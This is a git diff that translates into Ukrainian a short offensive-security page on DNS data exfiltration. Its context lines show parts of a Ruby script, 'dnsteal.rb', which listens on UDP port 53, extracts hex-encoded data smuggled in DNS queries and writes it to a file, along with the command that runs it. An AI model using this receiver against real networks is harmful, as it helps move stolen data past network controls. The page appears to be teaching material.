@@ -1,8 +1,8 @@
 # DNS 
 
 
-## DNS Data Exfiltration 
-DNS out-band connection is usually allowed in local networks, which is the major benefits of using DNS to transfer data to external server. 
+## Ексфільтрація даних DNS 
+Віхідне DNS підключення зазвичай дозволено всередині локальних мереж, що є основною перевагою використання DNS для передачі даних до зовниішнього серверу.
 
 **dnsteal.rb**
 ```ruby
@@ -19,7 +19,7 @@ else
   file = ARGV[0]
 end
 
-# Open UDP Socket and bind it to port 53 on all interfaces
+# Відкриваємо UDP Сокет та прикріпляємо його до порту 53 на всіх інтерфейсах
 udpsoc = UDPSocket.new
 udpsoc.bind('0.0.0.0', 53)
 
@@ -33,7 +33,7 @@ begin
     response = response[0].force_encoding("ISO-8859-1").encode("utf-8")
     data = response.match(/[^<][a-f0-9]([a-f0-9]).*[a-f0-9]([a-f0-9])/i).to_s
     
-    # Write received data to file
+    # Записужмо отримані дані в файл
     File.open(file, 'a') do |d|
       d.write [data].pack("H*") unless data == data_old     # Don't write the same data twice(poor workaround)
       puts data unless data == data_old
@@ -47,7 +47,7 @@ rescue Exception => e
 end
 ```
 
-Run it 
+Запустіть скрипт:
 ```
 ruby dnsteal.rb image.jpg
 ```
